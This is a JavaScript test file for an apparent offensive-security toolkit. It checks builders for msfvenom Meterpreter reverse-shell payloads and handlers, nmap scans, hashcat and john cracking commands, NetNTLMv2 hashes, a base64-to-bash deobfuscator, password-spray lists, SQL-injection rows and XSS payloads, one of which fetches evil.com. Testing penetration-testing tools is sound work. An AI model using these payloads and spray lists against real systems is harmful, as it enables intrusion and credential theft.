// Offensive batch: builders, encoders and crypto. Run: npm test
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { build as msf, handler } from '../assets/tools/lib/msfvenom.js';
import { build as nmap, PRESETS } from '../assets/tools/lib/nmap.js';
import { hashcat, john, MODES } from '../assets/tools/lib/hashcat.js';
import { ntHash, md5, md4, hex, netNtlmv2, hmacMd5 } from '../assets/tools/lib/ntlm.js';
import { deobfuscate, bashObfuscate } from '../assets/tools/lib/cmdobf.js';
import { usernames, sprayList } from '../assets/tools/lib/permute.js';
import { apply as xss, PAYLOADS as XSS } from '../assets/tools/lib/xss.js';
import { rows as sqli, CATEGORIES } from '../assets/tools/lib/sqli.js';

test('msfvenom builder', () => {
  assert.equal(msf({ payload: 'windows/x64/meterpreter/reverse_tcp', lhost: '10.0.0.1', lport: '443', format: 'exe' }),
    'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f exe > payload.exe');
  assert.match(msf({ payload: 'linux/x64/shell_bind_tcp', lport: '4444', format: 'elf', encoder: 'x64/xor', iter: 3 }), /LPORT=4444.*-e x64\/xor -i 3 -f elf/);
  assert.match(msf({ payload: 'windows/exec', cmd: 'net user', format: 'raw' }), /CMD='net user'/);
  assert.match(handler({ payload: 'windows/x64/meterpreter/reverse_tcp', lhost: '10.0.0.1', lport: '443' }), /multi\/handler.*set LHOST 10\.0\.0\.1/);
});

test('nmap builder', () => {
  assert.equal(nmap({ target: '10.0.0.0/24', scan: '-sS', ports: 'top', top: 1000, sv: true, sc: true, t: 4, pn: true, open: true, v: 0 }),
    'nmap -sS -sV -sC --top-ports 1000 -Pn --open -T4 10.0.0.0/24');
  assert.match(nmap({ ...PRESETS['Full TCP + scripts'], target: 'host' }), /-p- .*-T4.*host$/);
  assert.match(nmap({ target: 'h', scan: '-sU', ports: 'list', list: '53, 161 ,500', t: 3, v: 0 }), /-sU -p 53,161,500 -T3 h/);
});

test('hashcat / john helper', () => {
  assert.equal(hashcat({ mode: 1000, attack: 0, hashfile: 'nt.txt', dict: 'rockyou.txt', rule: 'best64.rule' }),
    'hashcat -m 1000 -a 0 nt.txt rockyou.txt -r rules/best64.rule');
  assert.equal(hashcat({ mode: 0, attack: 3, mask: '?u?l?l?l?d?d' }), 'hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?d?d');
  assert.match(john({ mode: 1000, attack: 0, dict: 'rockyou.txt' }), /--format=nt --wordlist=rockyou\.txt/);
  assert.ok(MODES.find((m) => m[0] === 13100)); // kerberoast present
});

test('NTLM / NetNTLMv2', () => {
  assert.equal(ntHash('password'), '8846f7eaee8fb117ad06bdd830b7586c');
  assert.equal(hex(md5(new TextEncoder().encode('abc'))), '900150983cd24fb0d6963f7d28e17f72');
  assert.equal(hex(md4(new Uint8Array())), '31d6cfe0d16ae931b73c59d7e0c089c0');
  // HMAC-MD5 known vector (RFC 2202): key=0x0b*16, data="Hi There"
  assert.equal(hex(hmacMd5(new Uint8Array(16).fill(0x0b), new TextEncoder().encode('Hi There'))), '9294727a3638bb1c13f48ef8158bfc9d');
  const r = netNtlmv2('Administrator', 'CORP', 'P@ssw0rd', '1122334455667788', '0101000000000000ffffffffffffffff0011223344556677');
  assert.equal(r.ntHash, ntHash('P@ssw0rd'));
  assert.match(r.hashcat, /^Administrator::CORP:1122334455667788:[0-9a-f]{32}:0101/);
});

test('deobfuscate layered', () => {
  const b64 = Buffer.from('id;whoami').toString('base64');
  assert.equal(deobfuscate(`echo ${b64} | base64 -d | bash`).out, 'id;whoami');
  assert.equal(deobfuscate('\\x69\\x64').out, 'id');
  assert.equal(deobfuscate('(104,101,108,108,111)').out, 'hello');
  assert.ok(bashObfuscate('whoami').length >= 5);
});

test('username & spray permutations', () => {
  const u = usernames(['John Smith'], ['flast', 'first.last', 'f.last'], { domain: '@corp.local' });
  assert.ok(u.includes('jsmith@corp.local') && u.includes('john.smith@corp.local'));
  const u2 = usernames(['José Núñez'], ['flast']);
  assert.ok(u2.includes('jnunez'), u2.join());
  const s = sprayList({ bases: ['Acme'], year: 2025, seasons: true });
  assert.ok(s.some((p) => /Acme2025|Acme@2025/.test(p)) && s.some((p) => /Autumn2025|Winter25/.test(p)));
});

test('xss encoders + sqli rows', () => {
  assert.equal(xss('<svg onload=alert(1)>', 'html'), '&lt;svg onload=alert(1)&gt;');
  assert.equal(xss('<x>', 'html-dec'), '&#60;&#120;&#62;');
  assert.ok(xss("<img src=x onerror=fetch('//HOST/')>", 'none', 'evil.com').includes('evil.com'));
  assert.ok(XSS.length > 30);
  assert.ok(sqli('Authentication bypass', 'MySQL').some(([p]) => p.includes("OR '1'='1")));
  assert.ok(CATEGORIES.includes('Blind — time delay'));
  assert.ok(sqli('Blind — time delay', 'MSSQL').some(([p]) => p.includes('WAITFOR')));
});
